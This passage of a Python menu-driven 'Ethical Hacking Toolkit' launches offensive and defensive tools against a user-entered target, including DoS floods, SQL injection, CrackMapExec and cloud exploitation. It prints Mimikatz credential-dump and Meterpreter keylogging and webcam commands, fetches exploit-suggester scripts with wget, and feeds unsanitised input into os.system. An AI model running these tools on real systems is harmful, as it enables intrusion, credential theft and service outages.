        os.system(f"responder -I {interface}")
        
    def run_mitmf(self):
        """Run MITMf"""
        print(f"{Fore.YELLOW}[*] Starting MITMf...{Fore.RESET}")
        os.system("mitmf")
        
    def run_sniffjoke(self):
        """Run SniffJoke"""
        os.system("sniffjoke")
        
    def run_honeybadger(self):
        """Run HoneyBadger"""
        print(f"{Fore.YELLOW}[*] Starting HoneyBadger...{Fore.RESET}")
        os.system("honeybadger")
        
    # ==================== MOBILE HACKING ====================
    def mobile_menu(self):
        """Mobile Hacking Tools Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}📱 MOBILE HACKING{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "MobSF - Mobile Security Framework"),
                ("2", "AndroBugs - Android Scanner"),
                ("3", "QARK - Quick Android Review"),
                ("4", "APKTool - APK Reverse Engineering"),
                ("5", "Dex2Jar - Dalvik to Java"),
                ("6", "JD-GUI - Java Decompiler"),
                ("7", "Frida - Dynamic Instrumentation"),
                ("8", "Objection - Runtime Exploration"),
                ("9", "iRET - iOS Reverse Engineering"),
                ("10", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select mobile tool: {Fore.RESET}")
            
            if choice == "10":
                break
            elif choice == "1":
                self.run_mobsf()
            elif choice == "2":
                self.run_androbugs()
            elif choice == "3":
                self.run_qark()
            elif choice == "4":
                self.run_apktool()
            elif choice == "5":
                self.run_dex2jar()
            elif choice == "6":
                self.run_jdgui()
            elif choice == "7":
                self.run_frida()
            elif choice == "8":
                self.run_objection()
            elif choice == "9":
                self.run_iret()
                
    def run_mobsf(self):
        """Run MobSF"""
        print(f"{Fore.YELLOW}[*] Starting MobSF...{Fore.RESET}")
        os.system("mobsf &")
        print(f"{Fore.GREEN}[+] MobSF running on http://localhost:8000{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_androbugs(self):
        """Run AndroBugs"""
        apk = input(f"{Fore.BLUE}[?] Path to APK file: {Fore.RESET}")
        os.system(f"androbugs -f {apk}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_qark(self):
        """Run QARK"""
        apk = input(f"{Fore.BLUE}[?] Path to APK file: {Fore.RESET}")
        os.system(f"qark --apk {apk}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_apktool(self):
        """Run APKTool"""
        print(f"{Fore.CYAN}APKTool Options:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}Decode APK")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}Build APK")
        print(f"{Fore.WHITE}[3] {Fore.YELLOW}Install Framework")
        
        a_choice = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
        
        if a_choice == "1":
            apk = input(f"{Fore.BLUE}[?] APK file: {Fore.RESET}")
            os.system(f"apktool d {apk}")
        elif a_choice == "2":
            dir = input(f"{Fore.BLUE}[?] Directory: {Fore.RESET}")
            os.system(f"apktool b {dir}")
            
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_dex2jar(self):
        """Run Dex2Jar"""
        dex = input(f"{Fore.BLUE}[?] Path to dex file: {Fore.RESET}")
        os.system(f"d2j-dex2jar {dex}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_jdgui(self):
        """Run JD-GUI"""
        os.system("jd-gui &")
        
    def run_frida(self):
        """Run Frida"""
        print(f"{Fore.CYAN}Frida Options:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}List Applications")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}Run Script")
        print(f"{Fore.WHITE}[3] {Fore.YELLOW}Trace Methods")
        
        f_choice = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
        
        if f_choice == "1":
            os.system("frida-ps -U")
        elif f_choice == "2":
            script = input(f"{Fore.BLUE}[?] Script path: {Fore.RESET}")
            app = input(f"{Fore.BLUE}[?] App name/pid: {Fore.RESET}")
            os.system(f"frida -U -l {script} {app}")
            
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_objection(self):
        """Run Objection"""
        app = input(f"{Fore.BLUE}[?] App name/pid: {Fore.RESET}")
        os.system(f"objection -g {app} explore")
        
    def run_iret(self):
        """Run iRET"""
        os.system("iret &")
        
    # ==================== POST EXPLOITATION ====================
    def post_exploit_menu(self):
        """Post Exploitation Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}🖥️ POST EXPLOITATION{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "Meterpreter - Metasploit Payload"),
                ("2", "PowerSploit - PowerShell Post-Exploit"),
                ("3", "Empire - PowerShell Agent"),
                ("4", "CrackMapExec - Network Post-Exploit"),
                ("5", "Mimikatz - Credential Dumper"),
                ("6", "LinEnum - Linux Enumeration"),
                ("7", "Linux Exploit Suggester"),
                ("8", "Windows Exploit Suggester"),
                ("9", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select post-exploit tool: {Fore.RESET}")
            
            if choice == "9":
                break
            elif choice == "1":
                self.run_meterpreter()
            elif choice == "2":
                self.run_powersploit()
            elif choice == "3":
                self.run_empire()
            elif choice == "4":
                self.run_cme()
            elif choice == "5":
                self.run_mimikatz()
            elif choice == "6":
                self.run_linenum()
            elif choice == "7":
                self.run_les()
            elif choice == "8":
                self.run_wes()
                
    def run_meterpreter(self):
        """Meterpreter commands"""
        print(f"{Fore.YELLOW}[*] Common Meterpreter Commands:{Fore.RESET}")
        print("""
help           - Show help
sysinfo        - System information
getuid         - Current user
ps             - Process list
migrate PID    - Move to process
hashdump       - Dump hashes
screenshot     - Take screenshot
keyscan_start  - Start keylogging
keyscan_dump   - Dump keystrokes
webcam_snap    - Take webcam photo
shell          - System shell
upload file    - Upload file
download file  - Download file
background     - Background session
        """)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_powersploit(self):
        """Run PowerSploit"""
        print(f"{Fore.YELLOW}[*] PowerSploit PowerShell scripts{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Load in PowerShell: Import-Module PowerSploit{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_cme(self):
        """Run CrackMapExec"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target: {Fore.RESET}")
            
        print(f"{Fore.CYAN}CME Protocols:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}SMB")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}SSH")
        print(f"{Fore.WHITE}[3] {Fore.YELLOW}MSSQL")
        print(f"{Fore.WHITE}[4] {Fore.YELLOW}WinRM")
        
        c_choice = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
        
        proto_map = {"1": "smb", "2": "ssh", "3": "mssql", "4": "winrm"}
        proto = proto_map.get(c_choice, "smb")
        
        os.system(f"crackmapexec {proto} {self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_mimikatz(self):
        """Mimikatz info"""
        print(f"{Fore.YELLOW}[*] Mimikatz Commands:{Fore.RESET}")
        print("""
privilege::debug          - Enable debug
sekurlsa::logonpasswords  - Dump passwords
lsadump::lsa              - Dump LSA secrets
lsadump::sam              - Dump SAM
sekurlsa::tickets         - Dump tickets
kerberos::list            - List kerberos
        """)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_linenum(self):
        """Run LinEnum"""
        os.system("wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")
        os.system("chmod +x LinEnum.sh")
        print(f"{Fore.GREEN}[+] LinEnum.sh downloaded{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_les(self):
        """Linux Exploit Suggester"""
        os.system("wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh")
        os.system("chmod +x linux-exploit-suggester.sh")
        print(f"{Fore.GREEN}[+] LES downloaded{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_wes(self):
        """Windows Exploit Suggester"""
        os.system("wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py")
        print(f"{Fore.GREEN}[+] WES downloaded{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    # ==================== DATABASE ASSESSMENT ====================
    def database_menu(self):
        """Database Assessment Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}🔧 DATABASE ASSESSMENT{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "SQLMap - SQL Injection"),
                ("2", "NoSQLMap - NoSQL Injection"),
                ("3", "BBQSQL - Blind SQL Injection"),
                ("4", "jSQL Injection - Java SQL"),
                ("5", "SqlNinja - MS SQL Exploit"),
                ("6", "MDB Tools - Access DB"),
                ("7", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select database tool: {Fore.RESET}")
            
            if choice == "7":
                break
            elif choice == "1":
                self.run_sqlmap()
            elif choice == "2":
                self.run_nosqlmap()
            elif choice == "3":
                self.run_bbqsql()
            elif choice == "4":
                self.run_jsql()
            elif choice == "5":
                self.run_sqlninja()
            elif choice == "6":
                self.run_mdbtools()
                
    def run_bbqsql(self):
        """Run BBQSQL"""
        os.system("bbqsql")
        
    def run_jsql(self):
        """Run jSQL Injection"""
        os.system("jsql-injection &")
        
    def run_sqlninja(self):
        """Run SQLNinja"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target: {Fore.RESET}")
            
        os.system(f"sqlninja -m http -t {self.target}")
        
    def run_mdbtools(self):
        """Run MDB Tools"""
        mdb = input(f"{Fore.BLUE}[?] Path to MDB file: {Fore.RESET}")
        os.system(f"mdb-tables {mdb}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    # ==================== CLOUD SECURITY ====================
    def cloud_menu(self):
        """Cloud Security Tools Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}☁️ CLOUD SECURITY{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "Pacu - AWS Exploitation"),
                ("2", "ScoutSuite - Cloud Audit"),
                ("3", "CloudSploit - Cloud Scanner"),
                ("4", "GCP Scanner - Google Cloud"),
                ("5", "AzureHound - Azure Enum"),
                ("6", "CloudMapper - AWS Visualization"),
                ("7", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select cloud tool: {Fore.RESET}")
            
            if choice == "7":
                break
            elif choice == "1":
                self.run_pacu()
            elif choice == "2":
                self.run_scoutsuite()
            elif choice == "3":
                self.run_cloudsploit()
            elif choice == "4":
                self.run_gcpscanner()
            elif choice == "5":
                self.run_azurehound()
            elif choice == "6":
                self.run_cloudmapper()
                
    def run_pacu(self):
        """Run Pacu"""
        os.system("pacu")
        
    def run_scoutsuite(self):
        """Run ScoutSuite"""
        os.system("scout")
        
    def run_cloudsploit(self):
        """Run CloudSploit"""
        print(f"{Fore.YELLOW}[*] Running CloudSploit...{Fore.RESET}")
        os.system("cloudsploit")
        
    def run_gcpscanner(self):
        """Run GCP Scanner"""
        os.system("gcp-scanner")
        
    def run_azurehound(self):
        """Run AzureHound"""
        os.system("azurehound")
        
    def run_cloudmapper(self):
        """Run CloudMapper"""
        os.system("cloudmapper")
        
    # ==================== DOS TESTING ====================
    def dos_menu(self):
        """DoS Testing Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}🛡️ DOS TESTING{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "LOIC - Low Orbit Ion Cannon"),
                ("2", "HOIC - High Orbit Ion Cannon"),
                ("3", "Slowloris - Slow HTTP DoS"),
                ("4", "RUDY - R-U-Dead-Yet"),
                ("5", "Hping3 - Network DoS"),
                ("6", "GoldenEye - HTTP DoS"),
                ("7", "THC-SSL-DoS - SSL DoS"),
                ("8", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select DoS tool: {Fore.RESET}")
            
            if choice == "8":
                break
            elif choice == "1":
                self.run_loic()
            elif choice == "2":
                self.run_hoic()
            elif choice == "3":
                self.run_slowloris()
            elif choice == "4":
                self.run_rudy()
            elif choice == "5":
                self.run_hping3()
            elif choice == "6":
                self.run_goldeneye()
            elif choice == "7":
                self.run_thcssldos()
                
    def run_loic(self):
        """Run LOIC"""
        os.system("loic")
        
    def run_hoic(self):
        """Run HOIC"""
        os.system("hoic")
        
    def run_slowloris(self):
        """Run Slowloris"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target: {Fore.RESET}")
            
        os.system(f"slowloris {self.target}")
        
    def run_rudy(self):
        """Run RUDY"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target: {Fore.RESET}")
            
        os.system(f"rudy -s {self.target}")
        
    def run_goldeneye(self):
        """Run GoldenEye"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target: {Fore.RESET}")
            
        os.system(f"goldeneye {self.target}")
        
    def run_thcssldos(self):
        """Run THC-SSL-DoS"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target: {Fore.RESET}")
            
        os.system(f"thc-ssl-dos {self.target}")
        
    # ==================== FORENSICS ====================
    def forensics_menu(self):
        """Forensics Tools Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}🔬 FORENSICS TOOLS{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "Autopsy - Digital Forensics"),
                ("2", "Sleuth Kit - File System Forensics"),
                ("3", "Volatility - Memory Forensics"),
                ("4", "FTK Imager - Forensic Imaging"),
                ("5", "Redline - Memory Analysis"),
                ("6", "Foremost - File Recovery"),
                ("7", "Binwalk - Firmware Analysis"),
                ("8", "Guymager - Disk Imaging"),
                ("9", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select forensics tool: {Fore.RESET}")
            
            if choice == "9":
                break
            elif choice == "1":
                self.run_autopsy()
            elif choice == "2":
                self.run_sleuthkit()
            elif choice == "3":
                self.run_volatility()
            elif choice == "4":
                self.run_ftk()
            elif choice == "5":
                self.run_redline()
            elif choice == "6":
                self.run_foremost()
            elif choice == "7":
                self.run_binwalk()
            elif choice == "8":
                self.run_guymager()
                
    def run_autopsy(self):
        """Run Autopsy"""
        os.system("autopsy &")
        
    def run_sleuthkit(self):
        """Run Sleuth Kit"""
        image = input(f"{Fore.BLUE}[?] Path to disk image: {Fore.RESET}")
        os.system(f"fls {image}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_volatility(self):
        """Run Volatility"""
        image = input(f"{Fore.BLUE}[?] Path to memory dump: {Fore.RESET}")
        
        print(f"{Fore.CYAN}Volatility Commands:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}Image Info")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}Process List")
        print(f"{Fore.WHITE}[3] {Fore.YELLOW}Network Connections")
        print(f"{Fore.WHITE}[4] {Fore.YELLOW}CMD History")
        
        v_choice = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
        
        profile = input(f"{Fore.BLUE}[?] Profile (e.g., Win7SP1x64): {Fore.RESET}")
        
        cmd_map = {
            "1": f"volatility -f {image} --profile={profile} imageinfo",
            "2": f"volatility -f {image} --profile={profile} pslist",
            "3": f"volatility -f {image} --profile={profile} netscan",
            "4": f"volatility -f {image} --profile={profile} cmdscan"
        }
        
        os.system(cmd_map.get(v_choice, ""))
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_ftk(self):
        """Run FTK Imager"""
        os.system("ftkimager &")
        
    def run_redline(self):
        """Run Redline"""
        os.system("redline &")
        
    def run_foremost(self):
        """Run Foremost"""
        image = input(f"{Fore.BLUE}[?] Path to image file: {Fore.RESET}")
        output = f"{self.output_dir}/foremost_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        os.system(f"foremost -i {image} -o {output}")
        print(f"{Fore.GREEN}[+] Recovered files saved to {output}{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_binwalk(self):
        """Run Binwalk"""
        file = input(f"{Fore.BLUE}[?] Path to firmware file: {Fore.RESET}")
        
        print(f"{Fore.CYAN}Binwalk Options:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}Scan for signatures")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}Extract files")
        
        b_choice = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
        
        if b_choice == "1":
            os.system(f"binwalk {file}")
        elif b_choice == "2":
            os.system(f"binwalk -e {file}")
            
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_guymager(self):
        """Run Guymager"""
        os.system("guymager &")
        
    # ==================== REPORTING ====================
    def reporting_menu(self):
        """Reporting Tools Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}📊 REPORTING{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "Generate HTML Report"),
                ("2", "Generate PDF Report"),
                ("3", "Generate CSV Report"),
                ("4", "View Log File"),
                ("5", "Clear Logs"),
                ("6", "Show Scan History"),
                ("7", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select report option: {Fore.RESET}")
            
            if choice == "7":
                break
            elif choice == "1":
                self.generate_html()
            elif choice == "2":
                self.generate_pdf()
            elif choice == "3":
                self.generate_csv()
            elif choice == "4":
                self.view_logs()
            elif choice == "5":
                self.clear_logs()
            elif choice == "6":
                self.show_history()
                
    def generate_html(self):
        """Generate HTML Report"""
        report = f"""<!DOCTYPE html>
<html>
<head>
    <title>Security Assessment Report</title>
    <style>
        body {{ font-family: Arial; margin: 40px; background: #f5f5f5; }}
        h1 {{ color: #2c3e50; border-bottom: 3px solid #3498db; }}
        .header {{ background: #3498db; color: white; padding: 20px; border-radius: 10px; }}
        .info {{ background: white; padding: 20px; margin: 20px 0; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
        .footer {{ text-align: center; color: #7f8c8d; margin-top: 50px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔒 Ethical Hacking Assessment Report</h1>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Target: {self.target or 'Not specified'}</p>
    </div>
    
    <div class="info">
        <h2>📋 Scan Information</h2>
        <p><strong>Toolkit Version:</strong> {self.version}</p>
        <p><strong>Author:</strong> {self.author}</p>
        <p><strong>Output Directory:</strong> {self.output_dir}</p>
    </div>
    
    <div class="info">
        <h2>📁 Scan Results</h2>
        <p>Check the following directories for detailed results:</p>
        <ul>
            <li><strong>{self.output_dir}/</strong> - Main output directory</li>
            <li><strong>loot/</strong> - Captured credentials</li>
            <li><strong>scans/</strong> - Scan results</li>
            <li><strong>exploits/</strong> - Exploit code</li>
        </ul>
    </div>
    
    <div class="info">
        <h2>⚠️ Disclaimer</h2>
        <p>This report is for authorized security testing only. 
        The information contained herein is confidential and should not be disclosed to unauthorized parties.</p>
    </div>
    
    <div class="footer">
        <p>© 2024 Ethical Hacking Toolkit - Educational Purpose Only</p>
    </div>
</body>
</html>"""
        
        report_file = f"{self.output_dir}/report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(report_file, 'w') as f:
            f.write(report)
            
        print(f"{Fore.GREEN}[+] HTML Report generated: {report_file}{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def generate_pdf(self):
        """Generate PDF Report"""
        html_file = f"{self.output_dir}/temp_report.html"
        pdf_file = f"{self.output_dir}/report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
        
        # Generate HTML first
        self.generate_html()
        
        try:
            os.system(f"wkhtmltopdf {html_file} {pdf_file}")
            print(f"{Fore.GREEN}[+] PDF Report generated: {pdf_file}{Fore.RESET}")
        except:
            print(f"{Fore.RED}[!] wkhtmltopdf not installed{Fore.RESET}")
            
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def generate_csv(self):
        """Generate CSV Report"""
        csv_file = f"{self.output_dir}/report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        
        with open(csv_file, 'w') as f:
            f.write("Timestamp,Tool,Target,Status\n")
            f.write(f"{datetime.now()},Toolkit,{self.target},Active\n")
            
        print(f"{Fore.GREEN}[+] CSV Report generated: {csv_file}{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def view_logs(self):
        """View log file"""
        if os.path.exists(self.log_file):
            os.system(f"cat {self.log_file}")
        else:
            print(f"{Fore.RED}[!] No log file found{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def clear_logs(self):
        """Clear log files"""
        confirm = input(f"{Fore.RED}[!] Clear all logs? (y/n): {Fore.RESET}")
        if confirm.lower() == 'y':
            open(self.log_file, 'w').close()
            print(f"{Fore.GREEN}[+] Logs cleared{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def show_history(self):
        """Show scan history"""
        print(f"{Fore.CYAN}Scan History:{Fore.RESET}")
        if os.path.exists(self.log_file):
            os.system(f"tail -20 {self.log_file}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    # ==================== TOOLKIT MANAGEMENT ====================
    def management_menu(self):
        """Toolkit Management Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}⚙️ TOOLKIT MANAGEMENT{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            options = [
                ("1", "Set Target"),
                ("2", "Check Dependencies"),
                ("3", "Install Missing Tools"),
                ("4", "Update Toolkit"),
                ("5", "Show System Info"),
                ("6", "Clear Output Directories"),
                ("7", "About"),
                ("8", "Back to Main Menu")
            ]
            
            for num, name in options:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select option: {Fore.RESET}")
            
            if choice == "8":
                break
            elif choice == "1":
                self.set_target_interactive()
            elif choice == "2":
                self.check_deps()
            elif choice == "3":
                self.install_tools()
            elif choice == "4":
                self.update_toolkit()
            elif choice == "5":
                self.show_system_info()
            elif choice == "6":
                self.clear_output()
            elif choice == "7":
                self.about()
                
    def set_target_interactive(self):
        """Set target interactively"""
        self.target = input(f"{Fore.BLUE}[?] Enter target IP/Domain: {Fore.RESET}")
        print(f"{Fore.GREEN}[+] Target set to: {self.target}{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def check_deps(self):
        """Check dependencies"""
        print(f"{Fore.YELLOW}[*] Checking dependencies...{Fore.RESET}")
        
        tools = [
            "nmap", "hydra", "john", "sqlmap", "nikto", "wpscan",
            "dirb", "dnsrecon", "whatweb", "aircrack-ng", "bettercap"
        ]
        
        installed = []
        missing = []
        
        for tool in tools:
            if self.check_tool_installed(tool):
                installed.append(tool)
                print(f"{Fore.GREEN}[✓] {tool}{Fore.RESET}")
            else:
                missing.append(tool)
                print(f"{Fore.RED}[✗] {tool}{Fore.RESET}")
                
        print(f"\n{Fore.CYAN}Summary:{Fore.RESET}")
        print(f"{Fore.GREEN}Installed: {len(installed)}{Fore.RESET}")
        print(f"{Fore.RED}Missing: {len(missing)}{Fore.RESET}")
        
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def check_tool_installed(self, tool):
        """Check if tool is installed"""
        try:
            subprocess.run([tool, "--version"], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL)
            return True
        except:
            return False
            
    def install_tools(self):
        """Install missing tools"""
        print(f"{Fore.YELLOW}[*] Installing tools...{Fore.RESET}")
        
        tools = [
            "nmap", "hydra", "john", "sqlmap", "nikto", "wpscan",
            "dirb", "dnsrecon", "whatweb", "aircrack-ng", "bettercap",
            "metasploit-framework", "burpsuite", "wireshark", "tcpdump",
            "ettercap", "responder", "wifite", "reaver", "crunch"
        ]
        
        os.system("apt-get update -y")
        
        for tool in tools:
            print(f"{Fore.BLUE}[*] Installing {tool}...{Fore.RESET}")
            os.system(f"apt-get install -y {tool}")
            
        print(f"{Fore.GREEN}[+] Installation complete!{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def update_toolkit(self):
        """Update toolkit"""
        print(f"{Fore.YELLOW}[*] Updating toolkit...{Fore.RESET}")
        os.system("apt-get update && apt-get upgrade -y")
        print(f"{Fore.GREEN}[+] Update complete!{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def show_system_info(self):
        """Show system information"""
        print(f"{Fore.CYAN}System Information:{Fore.RESET}")
        print(f"{Fore.WHITE}OS: {platform.system()} {platform.release()}{Fore.RESET}")
        print(f"{Fore.WHITE}Hostname: {platform.node()}{Fore.RESET}")
        print(f"{Fore.WHITE}Python: {platform.python_version()}{Fore.RESET}")
        print(f"{Fore.WHITE}Architecture: {platform.machine()}{Fore.RESET}")
        print(f"{Fore.WHITE}Toolkit Version: {self.version}{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def clear_output(self):
        """Clear output directories"""
        confirm = input(f"{Fore.RED}[!] Clear all output directories? (y/n): {Fore.RESET}")
        if confirm.lower() == 'y':
            dirs = [self.output_dir, "loot", "scans"]
            for dir_name in dirs:
                os.system(f"rm -rf {dir_name}/*")
            print(f"{Fore.GREEN}[+] Output directories cleared{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def about(self):
        """About toolkit"""
        print(f"{Fore.CYAN}════════════════════════════════════════════{Fore.RESET}")
        print(f"{Fore.YELLOW}Ethical Hacking Toolkit v{self.version}{Fore.RESET}")
        print(f"{Fore.WHITE}Author: {self.author}{Fore.RESET}")
        print(f"{Fore.WHITE}Description: All-in-one ethical hacking framework{Fore.RESET}")
        print(f"{Fore.WHITE}Tools: 50+ integrated tools{Fore.RESET}")
        print(f"{Fore.WHITE}Categories: 15+ categories{Fore.RESET}")
        print(f"{Fore.RED}⚠️ For Educational Use Only{Fore.RESET}")
        print(f"{Fore.CYAN}════════════════════════════════════════════{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def exit_toolkit(self):
        """Exit toolkit"""
        print(f"\n{Fore.GREEN}[+] Stay ethical! Goodbye!{Fore.RESET}")
        sys.exit(0)

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Ultimate Ethical Hacking Toolkit")
    parser.add_argument("-t", "--target", help="Set target IP/Domain")
    parser.add_argument("--install", action="store_true", help="Install all tools")
    parser.add_argument("--update", action="store_true", help="Update toolkit")
    
    args = parser.parse_args()
    
    toolkit = EthicalHackingToolkit()
    
    if args.target:
        toolkit.target = args.target
        
    if args.install:
        toolkit.install_tools()
    elif args.update:
        toolkit.update_toolkit()
    else:
        # Check root
        if os.geteuid() != 0:
            print(f"{Fore.RED}[!] This toolkit must be run as root!{Fore.RESET}")
            print(f"{Fore.YELLOW}[*] Try: sudo python3 app.py{Fore.RESET}")
            sys.exit(1)
            
        toolkit.main_menu()

if __name__ == "__main__":
    main()